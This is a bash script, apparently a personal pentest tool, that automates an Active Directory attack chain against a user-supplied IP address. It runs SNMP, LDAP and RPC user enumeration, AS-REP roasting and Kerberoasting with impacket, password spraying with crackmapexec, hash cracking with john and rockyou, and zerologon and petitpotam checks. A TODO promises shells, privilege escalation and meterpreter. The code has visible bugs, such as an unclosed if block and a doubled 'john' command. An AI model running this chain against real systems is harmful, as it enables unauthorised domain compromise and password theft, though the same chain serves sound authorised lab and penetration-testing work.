#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
CYAN='\e[96m'
BOLDGREEN="\e[1;${CYAN}"
ENDCOLOR="\e[0m"

echo ""
echo -e "${GREEN} █     █░ ██▓ ███▄    █  ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀     ${ENDCOLOR}"
echo -e "${GREEN}▓█░ █ ░█░▓██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒      ${ENDCOLOR}"
echo -e "${GREEN}▒█░ █ ░█ ▒██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░      ${ENDCOLOR}" 
echo -e "${GREEN}░█░ █ ░█ ░██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄      ${ENDCOLOR}" 
echo -e "${GREEN}░░██▒██▓ ░██░▒██░   ▓██░▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄     ${ENDCOLOR}"
echo -e "${GREEN}░ ▓░▒ ▒  ░▓  ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒     ${ENDCOLOR}"
echo -e "${GREEN}  ▒ ░ ░   ▒ ░░ ░░   ░ ▒░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░     ${ENDCOLOR}"
echo -e "${GREEN}  ░   ░   ▒ ░   ░   ░ ░ ░         ░  ░░ ░   ░   ░        ░ ░░ ░      ${ENDCOLOR}"
echo -e "${RED}      ░     ░           ░ ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░        ${ENDCOLOR}"
echo -e "${RED}                          ░                       ░                    ${ENDCOLOR}"


echo -e "${BOLDGREEN} ~ Personnal script for checking activedirectory vulnérabilities  ~${ENDCOLOR}"
echo  -n -e "${BOLDGREEN} ~ Enter ip adress : ${ENDCOLOR}"&read ip

# New part to check SNMP ( OSCP )
# TODO --> check version of SNMP and test 
out_nmap=$(sudo nmap -sS -sU -p- $ip > out_map)

check_snmp=$( cat out_map | grep 161 )
if [ "$check_snmp" ];then
	echo "Potential listing Users [ ... ]"
	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
	if [ -n $snmpwalk ];then
		echo $snmp_user > snmp_users.txt
	fi
	echo "Potential enum for process [ ... ]"
	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
fi

## Check for domain part with CME / possibility switch with dnsrecon
domain=$(crackmapexec smb $ip | cut -d: -f3 | cut -d\) -f1   )
if [ "$domain" ];then
	echo -e "${GREEN}[+] Domain found  --> $domain ${ENDCOLOR}"
fi

sudo echo "$ip $domain" >> /etc/hosts

name=$(echo $domain | cut -d. -f1)
ext=$(echo $domain | cut -d. -f2)

## LDAP check for anonymous binding 
out=$(ldapsearch -x -H ldap://$ip -b 'DC='$name',DC='$ext'')

bind_verif=$(echo $out | grep 'result' | cut -d: -f2 | cut -d ' ' -f3)

if [ "$bind_verif" = "success" ];then
	echo -e "${GREEN}[+] Anonymous bind is possible ${ENDCOLOR}"
	else
		echo -e "${RED}[-] No succes to bind ldap anonymous  ${ENDCOLOR}"
fi

# Enum4Linux to check RPC enum for discovering some User's 
enum4linux $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 > users.txt 

check_users=$(cat users.txt)

# If users found try forst attack ASP_RES_ROAST 
if [ -n "$check_users" ];then
	echo -e "${GREEN}[+] Users Found with Eum4linux, trying ASP_REQ_ATTACK${ENDCOLOR}"

	#ASP_REQ_ROAST_CHECK 
	python3 /opt/tools/windows/impacket/examples/GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
	confirm=$(ls | grep hash.asproast)
	if [ "$confirm" = "hash.asproast" ];then
		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt
	fi 

	## Try password spraying 
	passspray=$(crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes | grep -E -i + | cut -d: -f1)
	if [ -n $snmp_user ];then
		snmp_passspray=$(crackmapexec smb $ip -u snmp_users.txt -p snmp_users.txt --no-bruteforce --continue-on-succes | grep -E -i + | cut -d: -f1)
		## Kerberoast attack
		if [ -n "$snmp_passspray" ];then
			echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"

			echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK  ... ${ENDCOLOR}"

			python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -request -dc-ip $ip $domain/$snmp_passspray  -outputfile hashes.kerberoast 
			check_snmp_kerberoast=$(ls hashes.kerberoast)
			if [ -n "$check_snmp_kerberoast" ]; then
				echo -e "${GREEN}[+] User $snmp_passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
				john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
			fi
	fi
	## Kerberoast attack

	if [ -n "$passspray" ];then
		echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"

		echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK  ... ${ENDCOLOR}"

		python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
		check_kerberoast=$(ls hashes.kerberoast)
		if [ -n "$check_kerberoast" ]; then
			echo -e "${GREEN}[+] User $passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
			john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
		fi

	else 
		echo -e "${RED}[-] No found users kerboastable ${ENDCOLOR}"
		# Users as pass attack 
		crackmapexec smb $ip -u users.txt -p users.txt -M adcs
		crackmapexec winrm $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes
	fi

else 
	echo -e "${RED}[-] No users found ${ENDCOLOR}"
	rm users.txt 
	rm out_map
fi


#CHECKING Possible vuln like zerologon / petitpotam 
crackmapexec smb $ip -u "" -p "" -M zerologon
crackmapexec smb $ip -u "" -p "" -M petitpotam



## Version 2 include attack with shell 

# TODO :

# - all petitpotam attack ( juicy potato, rotten pottato ect .. )
# - Lauch winsh + winpeas
# - switch integrity by foolhelper.exe
# - launch fully meterpreter